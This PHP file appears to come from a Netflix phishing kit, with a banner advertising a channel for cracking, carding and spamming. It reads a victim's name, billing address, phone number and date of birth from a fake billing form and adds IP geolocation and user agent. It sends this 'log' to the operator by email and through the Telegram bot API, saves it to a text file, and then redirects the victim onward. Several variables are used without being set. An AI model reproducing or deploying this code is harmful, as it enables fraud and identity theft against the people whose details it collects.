<?php
/*



 ██████╗██╗     ███████╗ █████╗ ███╗   ██╗        ████████╗ ██████╗  ██████╗ ██╗     ███████╗        ███╗   ██╗███████╗████████╗
██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝        ████╗  ██║██╔════╝╚══██╔══╝
██║     ██║     █████╗  ███████║██╔██╗ ██║           ██║   ██║   ██║██║   ██║██║     ███████╗        ██╔██╗ ██║█████╗     ██║   
██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║           ██║   ██║   ██║██║   ██║██║     ╚════██║        ██║╚██╗██║██╔══╝     ██║   
╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗███████║███████╗██║ ╚████║███████╗   ██║   
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

[ Cracking , Hacking , Method , Spamming , Giveaways , Carding , Database , Courses ]

[ Channel : @clean_tools_net ]

[ Website : www.clean-tools.net ]

      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/

session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';

$ip = getenv("REMOTE_ADDR");

$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$_SESSION['firstName'] = $_POST['firstName'];
$_SESSION['lastName'] = $_POST['lastName'];
$_SESSION['country'] = $_POST['country'];
$_SESSION['address'] = $_POST['address'];
$_SESSION['address2'] = $_POST['address2'];
$_SESSION['zipcode'] = $_POST['zipcode'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['birthday'] = $_POST['birthday'];
$_SESSION['phonelastnum'] = $phonelastnum;

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$country      = $data->country ?? 'Unknown';
$countryCode  = $data->countryCode ?? 'Unknown';
$regionName   = $data->regionName ?? 'Unknown';
$lat          = $data->lat ?? '';
$timezone     = $data->timezone ?? '';
$isp          = $data->isp ?? '';
$as           = $data->as ?? '';
$city         = $data->city ?? '';
$region       = $data->region ?? '';
$zip          = $data->zip ?? '';


$message = "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\r\n";
$message .= "[+] First name      : ".$_POST['firstName']."\r\n";
$message .= "[+] Last name      	 : ".$_POST['lastName']."\r\n";
$message .= "[+]━━━━【📓 Billing INFO】━━━━[+]\r\n";
$message .= "[+] Country      	 : ".$_POST['country']."\r\n";
$message .= "[+] Billing Address [📓]     	 : ".$_POST['address']."\r\n";
$message .= "[+] Billing Address 2 [📓]       : ".$_POST['address2']."\r\n";
$message .= "[+] Zip code      	 : ".$_POST['zipcode']."\r\n";
$message .= "[+] City     	 : ".$_POST['city']."\r\n";
$message .= "[+] State        : ".$_POST['state']."\r\n";
$message .= "[+] Phone      	 : ".$_POST['phone']."\r\n";
$message .= "[+] Date of birth 🎂       : ".$_POST['birthday']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[+]━━━━【🔥 NetFlix Fire 🔥】━━━━[+]\n";


$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 🔥 NetFlix log 🔥  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 
mail($send,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

$myfile = fopen("NetFlix_RzlT.txt", "a+");$txt = $message;fwrite($myfile, $txt);fclose($myfile);

HEADER("Location: ../plan.php");


?>

